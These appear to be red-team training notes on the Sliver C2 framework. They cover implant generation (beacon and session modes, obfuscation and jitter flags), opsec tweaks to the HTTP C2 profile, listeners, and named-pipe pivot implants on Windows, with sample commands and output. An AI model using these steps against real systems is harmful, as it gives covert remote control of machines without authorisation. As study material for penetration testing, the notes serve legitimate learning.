Implants offer network connections on different sets of protocols and a means of communication between a C2 server and the target workstation/server. 

`Beacon` mode - operates in intervals
`Session` mode - enables immediate execution of commands by the operator

#### Implants
Generating Implants
```bash
# Genernate implant in beacon mode
sliver > generate beacon --help    # list all flags

# Some notable options
-J / --jitter            # set up jitter time of callback
-S / --seconds           # set time interval of callback   ( default = 60 seconds )
-N / --name <name>       # name of implant
-l / --skip-symbols      # no obfuscation
-o / --os <OS>           # specify operating system ( windows / linux / mac )
-b / --http              # http connection string
-n / --dns               # dns connection string
-p / --named-pipe        # named-pipe connection strings
<SNIP>
```

Examples
```bash
# non-obfuscated implant
sliver > generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows

# obfuscated implant
sliver > generate beacon --http 127.0.0.1 -N http_beacon_obfuscated --os windows
```

#### Opsec
Using HTTPS, MTLS, or WireGuard listeners adds a layer of protection

For the HTTP(S) listener, we can make some modifications to the C2 profile file `~/.sliver/config/http-c2.json`, such as adding a legitimate request or response headers and changing filenames and extensions in URL generation. [HTTPS profile file documentation here](https://sliver.sh/docs?name=HTTPS+C2)

## Listeners
We can start a listener in Sliver based on the protocol chosen by us when we generated the binary of the implant.
```bash
# http listener
sliver > http --lport 8088

# check current listeners
sliver > jobs      # sliver operates on 31337, job ID 1 and should not be stopped
```

## Named Pipes
Named pipe is a concept for creating communication between a server and a client; this can be a process on computer A and a process on computer B. Each pipe has a unique name following the format of `\\ServerName\pipe\PipeName` or `\\.\pipe\PipeName`

In Sliver, named pipes are primarily used for pivoting on Windows.

```powershell
# Enumerating named pipes
PS C:\Users\hacker> ls \\.\pipe\
```

A pivot listener is close to a bind shell; we are starting a pivot listener on Host A, and from Host B, we will connect to Host A

Used in environments where traffic routing is quite restricted

Named Pipe implants
```bash
# Start pipe pivot listener
[server] sliver (http_beacon) > pivots named-pipe --bind <NAME>
	[*] Started named pipe pivot listener \\.\pipe\<NAME> with id 1

# Generate pivot implant
sliver > generate --named-pipe 127.0.0.1/pipe/NAME -N pipe_<NAME> --skip-symbols
	[*] Generating new windows/amd64 implant binary
	[!] Symbol obfuscation is disabled
	[*] Build completed in 1s
	[*] Implant saved to /home/htb-ac-8414/pipe_<NAME>.exe
```



